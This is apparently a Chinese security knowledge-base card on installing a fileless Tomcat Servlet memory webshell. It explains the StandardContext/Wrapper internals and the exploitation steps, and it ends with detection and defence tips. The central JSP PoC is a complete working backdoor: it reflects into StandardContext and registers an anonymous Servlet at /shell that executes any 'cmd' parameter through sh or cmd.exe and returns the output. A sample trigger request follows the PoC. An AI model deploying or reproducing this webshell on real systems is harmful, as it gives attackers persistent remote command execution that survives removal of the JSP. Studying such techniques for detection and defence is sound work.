---
id: web-java-component-tomcat-standardcontext-servlet-memshell
title: Tomcat Servlet 内存马：反射 StandardContext 创建 Wrapper 并注册 ServletMapping
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-standardcontext-servlet-memshell
tags:
- java
- tomcat
- memshell
- servlet
- standardcontext
- wrapper
- persistence
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V76
  verified_at: '2026-11-05T16:50:23+08:00'
  notes: 已对照原文与 img/07-13 核对：img/08 为 Tomcat 9.0.112 + JDK1.8，img/10 访问 memhorse.jsp 注入，img/11/12 /shell?cmd=whoami 回显 laptop-g6fumr67\allen，img/13 重启后 404；PoC 的 ApplicationContextFacade→ApplicationContext→StandardContext、createWrapper/addChild/addServletMappingDecoded 与原文一致。环境版本非影响区间，未设 affected_versions；PoC 未执行。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-standardcontext-servlet-memshell/
draft: false
kb_aliases:
- Tomcat Servlet 内存马
- StandardContext createWrapper
- addServletMappingDecoded 内存马
- ApplicationContextFacade 反射
- JSP 注入 Servlet 后门
- 无文件 Servlet WebShell
---

## 一句话结论

在已能执行一次 JSP 或 Java 代码的 Tomcat 中，通过反射 `ApplicationContextFacade.context → ApplicationContext.context` 取得 `StandardContext`，用 `createWrapper()` 构造 Wrapper 包装匿名 Servlet，再 `addChild()` + `addServletMappingDecoded()` 注册 URL 映射，即可得到一个不落盘、删除 JSP 后仍存活、直到 Tomcat 重启才消失的 Servlet 内存马。

## 原理

- Tomcat 的容器层级为 Server → Service → Engine → Host → Context（`StandardContext`）→ Wrapper（Servlet）。`StandardContext` 的 `children` 持有 Wrapper，`addChild()` 把 Wrapper 挂入容器；`addServletMappingDecoded(url, wrapperName, jspWildcard)` 把 URL 模式绑定到该 Wrapper，后续请求由 Mapper 定位并调用 `Servlet.service`。
- `StandardContext.createWrapper()` 创建未初始化的 Wrapper；`setServlet(servlet)` 直接绑定 Servlet 实例，`setServletClass(className)` 记录类名，`setLoadOnStartup(1)` 让它随容器启动加载。
- JSP 隐式对象 `application` 的实际类型是 `ApplicationContextFacade`，其私有字段 `context` 指向 `ApplicationContext`，后者私有字段 `context` 才指向 `StandardContext`；反射 `setAccessible(true)` 后可调用上述运行时 API。
- 恶意 Servlet 在 JSP 中以匿名内部类定义，由 Jasper 的 `JasperLoader` 加载，类名形如 `org.apache.jsp.<jsp名>$1`，没有独立的 `.class` 文件落盘；请求 `/shell?cmd=...` 时执行命令并回显。容器重启后内存结构重建，后门消失。

## 触发条件

- 已获得一次 JSP 文件写入/执行能力，或任意 Java 代码执行；
- 目标为 Tomcat（原文环境 Tomcat 9.0.112、JDK 1.8；Tomcat 7/8/9 同类 API 可用）；
- `addServletMappingDecoded` 需要 Tomcat 9.0.21+，更老版本改用 `addServletMapping`；
- 上下文可通过反射访问（默认无 SecurityManager 限制）；
- 需要确定一个映射路径（如 `/shell`），该路径不能与现有业务冲突。

## 利用步骤

1. 在 Web 目录写入 JSP（或通过其他 RCE 执行等价 Java 代码），定义命令执行型匿名 `Servlet`。
2. 反射取 `StandardContext`：`application` → `ApplicationContextFacade.context` → `ApplicationContext.context`。
3. `createWrapper()`，设置 `name`、`loadOnStartup`、`servlet` 实例与 `servletClass`。
4. `standardContext.addChild(wrapper)` 挂入容器。
5. `standardContext.addServletMappingDecoded("/shell", "jweny", false)` 注册 URL 映射。
6. 访问 `/shell?cmd=whoami` 验证；删除 JSP 后再次访问，若仍可用说明内存马已驻留；重启 Tomcat 后应返回 404。

## PoC

```jsp
<%@ page import="java.io.*,java.util.*,javax.servlet.*,org.apache.catalina.core.*" %>
<%
Servlet servlet = new Servlet() {
  public void init(ServletConfig c) {}
  public ServletConfig getServletConfig() { return null; }
  public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
    String cmd = req.getParameter("cmd");
    boolean linux = !System.getProperty("os.name").toLowerCase().contains("win");
    String[] cmds = linux ? new String[]{"sh","-c",cmd} : new String[]{"cmd.exe","/c",cmd};
    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    Scanner s = new Scanner(in).useDelimiter("\\A");
    res.getWriter().println(s.hasNext() ? s.next() : "");
  }
  public String getServletInfo() { return null; }
  public void destroy() {}
};
ApplicationContextFacade facade = (ApplicationContextFacade) application;
java.lang.reflect.Field f = ApplicationContextFacade.class.getDeclaredField("context");
f.setAccessible(true);
ApplicationContext app = (ApplicationContext) f.get(facade);
f = ApplicationContext.class.getDeclaredField("context");
f.setAccessible(true);
StandardContext ctx = (StandardContext) f.get(app);
Wrapper w = ctx.createWrapper();
w.setName("jweny");
w.setLoadOnStartup(1);
w.setServlet(servlet);
w.setServletClass(servlet.getClass().getName());
ctx.addChild(w);
ctx.addServletMappingDecoded("/shell", "jweny", false);
%>
```

请求：

```http
GET /shell?cmd=whoami HTTP/1.1
Host: target:8080
```

## 变体与关联

- 变体：不绑定固定 URL、希望任意路径都能触发时，改用 Filter/Listener/Valve 型内存马。
- 关联攻击卡：[[web-java-component-tomcat-dynamic-filter-memshell]]、[[web-java-component-tomcat-listener-memshell]]、[[web-java-component-tomcat-valve-memshell]]、[[web-java-component-tomcat-upgrade-memshell]]、[[web-java-component-tomcat-executor-memshell]]。
- 关联入口：[[web-java-component-tomcat-cve-2017-12615-put-jsp-upload]]（PUT 上传 JSP 作为注入载体）；[[web-java-classloader-jsp-memory-servlet-webshell]] 使用自定义 ClassLoader + defineClass 注册内存 Servlet，本卡则直接以匿名类实例注册 Wrapper，链路更短。
- 关联排查：[[defense-detection-tomcat-memshell-scanner-arthas]]、[[defense-forensics-java-memshell-heapdump-bytecode]]。

## 检测与防御

- 检测：`StandardContext` 中出现类名带 `$`、无对应磁盘 class 文件的 Wrapper；Web 请求命中未在 `web.xml`/注解中声明的 URL 映射；`org.apache.jsp.*$1` 形式的类；JSP 被访问后出现新的 Servlet 类。
- 防御：禁止上传/写入 JSP，关闭不必要的 PUT；收敛 Web 目录写权限；及时删除废弃 JSP；使用 RASP/Agent 监控 `StandardContext.addChild`、`addServletMapping` 等运行时注册行为；重启容器可清除内存马，但必须同时修复入口。
